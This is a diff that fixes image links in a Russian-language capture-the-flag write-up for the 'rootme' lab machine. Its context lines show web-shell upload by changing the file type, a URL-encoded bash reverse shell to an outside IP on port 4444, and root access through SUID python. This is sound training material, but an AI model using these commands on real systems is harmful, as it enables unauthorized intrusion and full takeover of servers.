@@ -23,7 +23,7 @@
 sudo nmap -sV -T4 10.114.148.4 -p-
 ```
 
-![Nmap scan result](ссылка/на/скрин/нмапа)
+![Nmap scan result](images/nmap-results.jpg)
 
 `T4` я использовал чтобы сканирование всех 65535 портов не заняло много времени
 
@@ -39,7 +39,7 @@ sudo nmap -sV -T4 10.114.148.4 -p-
 gobuster dir -u http://10.114.148.4 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 ```
 
-![GoBuster scan result](ссылка/на/скрин/гоубустера)
+![GoBuster scan result](images/gobuster-results)
 
 Результат на самом деле довольно хороший, в первую очередь я думаю будет отличной идеей проверить `http://10.114.148.4/uploads`, но даже в коде страницы ничего интересного я не нашёл, теперь решил попробовать посмотреть что в `http://10.114.148.4/panel` и тут можно upload-ить файлы, поэтому первое что я решил загружать туда, это файл shell.php в котором содержался такой код:
 
@@ -49,21 +49,21 @@ gobuster dir -u http://10.114.148.4 -w /usr/share/wordlists/dirb/common.txt -x p
 
 Нужен он для того, чтобы создать на сервере **web-shell** и потом получить **reverse-shell** с помощью него, но как наверное было очевидно, файлы формата PHP загружать нельзя
 
-![Login page](shell-php-result)
+![Login page](images/shell-php-result)
 
 Однако попробовав загрузить файл формата `.png` у меня получилось
 
-![Login page](png-result.jpg)
+![Login page](images/png-result.jpg)
 
 Поэтому я решил использовать утилиту `**Burp Suite**`
 
-![Login page](burpsuite.jpg)
+![Login page](images/burpsuite.jpg)
 
 ---
 
 Для начала я перешёл из `Dashboard` в `Proxy -> intercept`, потом поменял `intercept off` на `intercept on` и после этого, настроив *FireFox* чтобы `Burpsuite` мог перехватывать запросы, я начал свою 'операцию'
 
-![Login page](burpsuite-php-to-png.jpg)
+![Login page](images/burpsuite-php-to-png.jpg)
 
 В строке
 `Content-Type: application/x-php`
@@ -74,10 +74,10 @@ gobuster dir -u http://10.114.148.4 -w /usr/share/wordlists/dirb/common.txt -x p
 
 Это важно, потому что если поменять файл на какое-либо другое расширение, то он просто не выполнит команду, которую он содержит
 
-![Login page](burpsuite-yes.jpg)
+![Login page](images/burpsuite-yes.jpg)
 
 ---
-![Login page](uploads-result.jpg)
+![Login page](images/uploads-result.jpg)
 
 Теперь у нас получилось загрузить файл с `web-shell` на сайт прямо в папку `uploads`, что на самом деле отличный результат! (файл phpml это моя ошибка в правописании, не обращайте внимание)
 
@@ -87,13 +87,13 @@ gobuster dir -u http://10.114.148.4 -w /usr/share/wordlists/dirb/common.txt -x p
 http://10.114.148.4/uploads/shell.phtml?cmd=whoami
 ```
 
-![Login page](uploads-shell-result.jpg)
+![Login page](images/uploads-shell-result.jpg)
 
 И да, всё работает. Теперь пришло время получать **reverse-shell**
 
 Сначала откроем 4444-ый порт на другом терминале kali:
 
-![Login page](kali-lvp.jpg)
+![Login page](images/kali-lvp.jpg)
 
 И в `URL` запрос вводим: `http://10.114.148.4/uploads/shell.phtml?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.166.222%2F4444%200%3E%261%27` Где:
 `%20 -   (пробел)
@@ -111,7 +111,7 @@ pwd
 sudo -l
 `
 
-![Login page](in-system.jpg)
+![Login page](images/in-system.jpg)
 
 На самом деле мы узнали довольно много полезного, мы `www-data` так что давайте сначала найдём флаг `user.txt`:
 
@@ -130,7 +130,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 Вывод которого я вам сейчас покажу:
 
-![Login page](input.jpg)
+![Login page](images/input.jpg)
 
 На первый взгляд ничего подозрительно, пока не замечаешь `/usr/bin/python2.7`
 
@@ -147,7 +147,7 @@ os.setuid(0) - команда, которая меняет айди пользо
 os.system("/bin/bash -p") - запускает командную оболочку с флагом -p, который сохраняет привилегии
 `
 
-![Login page](get-root.jpg)
+![Login page](images/get-root.jpg)
 
 И с помощью этой команды, мы получим `root`
 
@@ -159,7 +159,7 @@ ls -la
 cat /root/root.txt
 ```
 
-![Login page](root-flag.jpg)
+![Login page](images/root-flag.jpg)
 
 Вот мы и прошли машинку `rootme`
 
